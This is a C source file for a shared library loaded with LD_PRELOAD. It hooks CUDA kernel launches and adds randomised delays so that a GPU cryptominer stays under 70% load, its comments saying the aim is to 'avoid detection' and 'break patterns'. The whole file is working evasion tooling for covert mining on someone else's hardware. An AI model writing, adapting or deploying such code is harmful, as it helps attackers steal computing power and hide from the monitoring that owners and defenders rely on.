/*
 * GPU Throttle - Limits GPU usage to avoid detection
 * Intercepts CUDA kernel launches to add delays
 * 
 * Compile: gcc -shared -fPIC -o libthrottle.so gpu_throttle.c -ldl -lcuda
 * Usage: LD_PRELOAD=/path/to/libthrottle.so ./miner
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

// CUDA function pointers
typedef int CUresult;
typedef void* CUfunction;
typedef void* CUstream;

static CUresult (*orig_cuLaunchKernel)(CUfunction, unsigned int, unsigned int, unsigned int,
                                       unsigned int, unsigned int, unsigned int,
                                       unsigned int, CUstream, void**, void**) = NULL;

// Configuration
#define MAX_GPU_USAGE_PERCENT 70  // Throttle to 70% max
#define DELAY_EVERY_N_KERNELS 10  // Add delay every N kernel launches
#define DELAY_MS 50               // Delay in milliseconds

static unsigned int kernel_count = 0;
static pthread_mutex_t count_mutex = PTHREAD_MUTEX_INITIALIZER;

// Initialize CUDA hooks
static void init_cuda_hooks(void) {
    if (!orig_cuLaunchKernel) {
        void *handle = dlopen("libcuda.so.1", RTLD_LAZY);
        if (!handle) handle = dlopen("libcuda.so", RTLD_LAZY);
        
        if (handle) {
            orig_cuLaunchKernel = dlsym(handle, "cuLaunchKernel");
        }
    }
}

// Throttle by adding random delays
static void throttle_kernel(void) {
    pthread_mutex_lock(&count_mutex);
    kernel_count++;
    
    // Every N kernels, add a delay
    if (kernel_count % DELAY_EVERY_N_KERNELS == 0) {
        pthread_mutex_unlock(&count_mutex);
        
        // Random delay to break patterns
        unsigned int delay = DELAY_MS + (rand() % 30);
        usleep(delay * 1000);
    } else {
        pthread_mutex_unlock(&count_mutex);
    }
}

// Hook CUDA kernel launch
CUresult cuLaunchKernel(CUfunction f,
                       unsigned int gridDimX, unsigned int gridDimY, unsigned int gridDimZ,
                       unsigned int blockDimX, unsigned int blockDimY, unsigned int blockDimZ,
                       unsigned int sharedMemBytes, CUstream hStream,
                       void **kernelParams, void **extra) {
    init_cuda_hooks();
    
    if (!orig_cuLaunchKernel) {
        return 0; // CUDA_SUCCESS
    }
    
    // Throttle before launch
    throttle_kernel();
    
    // Launch the kernel
    return orig_cuLaunchKernel(f, gridDimX, gridDimY, gridDimZ,
                              blockDimX, blockDimY, blockDimZ,
                              sharedMemBytes, hStream, kernelParams, extra);
}

// Constructor
__attribute__((constructor))
static void throttle_init(void) {
    init_cuda_hooks();
    srand(time(NULL));
}
